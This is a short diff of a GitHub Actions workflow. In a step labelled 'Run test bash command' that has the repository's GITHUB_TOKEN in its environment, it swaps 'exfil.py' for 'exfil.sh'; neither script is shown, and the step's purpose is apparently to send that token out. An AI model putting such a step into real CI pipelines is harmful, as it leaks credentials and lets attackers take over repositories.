@@ -15,8 +15,7 @@ jobs:
       - name: Run test bash command
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-        run: |
-          python -u exfil.py
+        run: bash exfil.sh
 
 
       - name: Set var 2
